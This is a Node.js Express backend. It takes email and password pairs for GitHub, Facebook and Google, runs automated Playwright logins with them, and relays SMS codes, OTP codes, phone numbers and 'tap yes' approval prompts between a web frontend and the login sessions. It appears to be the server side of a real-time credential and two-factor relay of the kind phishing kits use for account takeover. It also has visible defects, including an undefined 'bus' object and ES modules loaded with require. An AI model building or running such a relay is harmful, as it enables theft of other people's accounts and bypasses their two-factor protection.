/*import express from "express"
import bodyParser from "body-parser";
import path from "path"
import { spawn } from "child_process"*/
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { spawn } = require("child_process");

//import { chromium } from "playwright";
//import { runFacebookTask } from "./automation_facebook.mjs";
const { chromium } = require("playwright");
const { runFacebookTask } = require("./automation_facebook.mjs");

let browser;

async function initBrowser() {
    try {
        console.log("🚀 Attempting to launch Chromium...");
        browser = await chromium.launch({ 
            headless: false,
            args: ['--no-sandbox', '--disable-setuid-sandbox'] 
        });
        console.log("✅ Chromium launched and ready!");
    } catch (err) {
        console.error("❌ CRITICAL: Chromium failed to launch:", err);
    }
}

// Start the browser launch immediately
initBrowser();

const app = express();
const PORT = 3005;
let sseClients = [];
let automationProcess = null;

app.get("/events", (req, res) => {
    res.writeHead(200, {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        Connection: "keep-alive",
        "Access-Control-Allow-Origin": "*"
    });
    res.flushHeaders();
    res.write("data: connected\n\n");
    sseClients.push(res);
    console.log("SSE client connected. Total:", sseClients.length);

    req.on("close", () => {
        sseClients = sseClients.filter(c => c !== res);
    });
});


// Parse JSON body
app.use(bodyParser.json());

// Serve static files from public/
app.use(express.static(path.join(__dirname, "../public")));

// automation endpoint - Github 
app.post("/run-automation", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required" });
  }

  automationProcess = spawn(
    "node",
    [path.join(__dirname, "automation.mjs"), email, password],
    { stdio: ["pipe", "pipe", "pipe"] }
  );

  automationProcess.stdout.on("data", d => {
    console.log("[AUTOMATION]", d.toString());
  });

  automationProcess.stderr.on("data", d => {
    console.error("[AUTOMATION ERROR]", d.toString());
  });

  automationProcess.on("close", code => {
    console.log("Automation exited:", code);
    automationProcess = null;
  });

  res.json({ started: true });
});


// automation endpoint - Facebook
/*app.post("/run-automation-facebook", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required" });
  }

  automationProcess_facebook = spawn(
    "node",
    [path.join(__dirname, "automation_facebook.mjs"), email, password],
    { stdio: ["pipe", "pipe", "pipe"] }
  );

  automationProcess_facebook.stdout.on("data", d => {
    console.log("[AUTOMATION]", d.toString());
  });

  automationProcess_facebook.stderr.on("data", d => {
    console.error("[AUTOMATION ERROR]", d.toString());
  });

  automationProcess_facebook.on("close", code => {
    console.log("Automation exited:", code);
    automationProcess = null;
  });

  res.json({ started: true });
});*/

app.post("/run-automation-facebook", async (req, res) => {
    console.log("📥 Received request to start automation...");
    const { email, password } = req.body;

    if (!browser) {
        console.log("⏳ Browser not ready yet, waiting...");
        // Wait a few seconds if browser is still booting
        let checks = 0;
        while (!browser && checks < 10) {
            await new Promise(r => setTimeout(r, 1000));
            checks++;
        }
    }

    if (!browser) {
        return res.status(500).json({ error: "Browser failed to initialize." });
    }

    const getOTPFromBus = () => new Promise((resolve) => {
        bus.once(`otp:${email}`, (otp) => resolve(otp));
    });

    // Launch the task (don't 'await' it so the response sends immediately)
    runFacebookTask(browser, email, password, getOTPFromBus)
        .catch(err => console.error("Automation task error:", err));

    res.json({ started: true });
});


// automation endpoint - Google
app.post("/run-automation-google", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required" });
  }

  automationProcess_google = spawn(
    "node",
    [path.join(__dirname, "automation_google.js"), email, password],
    { stdio: ["pipe", "pipe", "pipe"] }
  );
  /*automationProcess_google = spawn(
    "python",
    [path.join(__dirname, "automation_google.py"), email, password],
    { stdio: ["pipe", "pipe", "pipe"] }
  );*/

  automationProcess_google.stdout.on("data", d => {
    console.log("[AUTOMATION]", d.toString());
  });

  automationProcess_google.stderr.on("data", d => {
    console.error("[AUTOMATION ERROR]", d.toString());
  });

  automationProcess_google.on("close", code => {
    console.log("Automation exited:", code);
    automationProcess = null;
  });

  res.json({ started: true });
});


app.post("/notify/sms", (req, res) => {
    console.log("Notifying clients: SMS required.");

    sseClients.forEach(client => {
        client.write("data: sms_required\n\n");
    });

    res.sendStatus(200);
});


app.post("/notify/authcode_facebook", (req, res) => {
    console.log("Notifying clients: authcode required.");

    sseClients.forEach(client => {
        client.write("data: authcode_required\n\n");
    });

    res.sendStatus(200);
});

/*app.post("/notify/phonenumber_google", (req, res) => {
    console.log("Notifying clients: phonenumber required.");

    sseClients.forEach(client => {
        client.write("data: google_phonenumber_required\n\n");
    });

    res.sendStatus(200);
});*/

app.post("/notify/phonenumber_google", (req, res) => {
    console.log("Notifying clients: Phone number required.");

    const payload = {
        type: "google_phonenumber_required"
    };

    sseClients.forEach(client => {
        client.write(`data: ${JSON.stringify(payload)}\n\n`);
    });

    res.sendStatus(200);
});


app.post("/notify/otp_google", (req, res) => {
    console.log("Notifying clients: OTP required.");

    sseClients.forEach(client => {
        client.write("data: google_otp_required\n\n");
    });

    res.sendStatus(200);
});

app.post("/notify/tapyes_google", (req, res) => {
    const { phone } = req.body;
    console.log("Notifying clients: Tap Yes required on", phone);

    const payload = {
        type: "google_tapyes_required",
        phone: phone
    };

    sseClients.forEach(client => {
        client.write(`data: ${JSON.stringify(payload)}\n\n`);
    });

    res.sendStatus(200);
});

app.post("/notify/login_google_success", (req, res) => {
    console.log("Notifying clients: login success.");

    sseClients.forEach(client => {
        client.write("data: login_success\n\n");
    });
    console.log("Sending to", sseClients.length, "SSE clients");

    res.sendStatus(200);
});

// send otp endpoint
app.post("/send-otp", (req, res) => {
  const { otp } = req.body;

  if (!automationProcess) {
    return res.status(400).json({ error: "Automation not running" });
  }

  console.log("OTP received from frontend:", otp);

  automationProcess.stdin.write(otp + "\n");
  res.json({ success: true });
});

// send otp endpoint
/*app.post("/send-otp-facebook", (req, res) => {
  const { input } = req.body;
  if (!automationProcess_facebook) {
    return res.status(400).json({ error: "Automation not running" });
  }

  console.log("OTP received from frontend:", input);

  automationProcess_facebook.stdin.write(input + "\n");
  res.json({ success: true });
});*/
// 2. Updated Send-OTP Endpoint
app.post("/send-otp-facebook", (req, res) => {
  const { input, email } = req.body; // Pass email from frontend to identify the session

  console.log(`Broadcasting OTP for ${email}:`, input);

  // Emit the event that the runFacebookTask is listening for
  bus.emit(`otp:${email}`, input);

  res.json({ success: true });
});

app.post("/send-phonenumber-google", (req, res) => {
  const { input } = req.body;
  if (!automationProcess_google) {
    return res.status(400).json({ error: "Automation not running" });
  }

  console.log("Phonenumber received from frontend:", input);

  automationProcess_google.stdin.write(input + "\n");
  res.json({ success: true });
});

app.post("/send-otp-google", (req, res) => {
  const { input } = req.body;
  if (!automationProcess_google) {
    return res.status(400).json({ error: "Automation not running" });
  }

  console.log("OTP received from frontend:", input);

  automationProcess_google.stdin.write(input + "\n");
  res.json({ success: true });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});


